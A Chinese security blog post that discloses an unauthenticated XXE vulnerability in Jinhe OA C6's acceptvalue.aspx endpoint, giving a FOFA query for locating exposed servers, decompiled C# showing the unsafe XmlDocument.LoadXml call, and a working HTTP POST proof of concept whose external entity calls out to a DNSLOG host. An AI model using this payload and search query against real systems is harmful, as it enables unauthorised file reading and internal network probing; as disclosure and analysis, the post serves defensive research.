---
title: "金和OA acceptvalue.aspx XXE漏洞"
source: https://mrxn.net/jswz/jhsoft-acceptvalue-xxe.html
asset_dir: assets/金和oa-acceptvalue.aspx-xxe漏洞
---

# 金和OA acceptvalue.aspx XXE漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/11/3 13:30
* 445浏览
* [0评论](#comment)
* 10分钟阅读

深入探索

软件

安全工具开发

SQL注入防护


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `acceptvalue.aspx` 接口处存在[XXE](https://mrxn.net/tag/XXE)漏洞，未授权的攻击者可以通过此漏洞读取服务器上敏感文件或探测内网服务信息，进一步利用可导致服务器失陷。

漏洞预警服务

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

直接根据 `acceptvalue.aspx` 在 `bin` 目录下查找 `JHSoft.Web.Archives.dll` 将其进行反编译后找到 **acceptvalue** 的处理逻辑

```
protected void Page_Load(object sender, EventArgs e)
{
  Stream inputStream = this.Request.InputStream;
  byte[] numArray = new byte[(int) inputStream.Length];
  inputStream.Read(numArray, 0, numArray.Length);
  inputStream.Close();
  string xml = Encoding.UTF8.GetString(numArray);
  XmlDocument xmlDocument = new XmlDocument();
  xmlDocument.LoadXml(xml);
```

请求内容直接使 `XmlDocument.LoadXml` 解析，造成[XXE](https://mrxn.net/tag/XXE)漏洞。

# 漏洞复现

深入探索

身份验证

文件大小转换

云安全解决方案

## XXE

```
POST /c6/Jhsoft.Web.Archives/acceptvalue.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://xxe.dnslog.pt/xxe_test">
%remote;]>
<root/>
```

在DNSLOG平台成功收到HTTP请求

[![金和OA acceptvalue.aspx XXE漏洞](images/img-001-5d9754b7ff40.webp)](https://image.mrxn.net/2717331bf52c4dd0a3f322019ceaf880.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#0day](https://mrxn.net/tag/0day)
* [#XXE](https://mrxn.net/tag/XXE)
* [#asp.net](https://mrxn.net/tag/asp.net)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)
* [5.1.XXE](#toc-5-1-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[金和OA acceptvalue.aspx XXE漏洞](https://mrxn.net/jswz/jhsoft-acceptvalue-xxe.html)  
文章链接：<https://mrxn.net/jswz/jhsoft-acceptvalue-xxe.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

安全研究工具

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/jhsoft-acceptvalue-xxe.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/jhsoft-acceptvalue-xxe.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 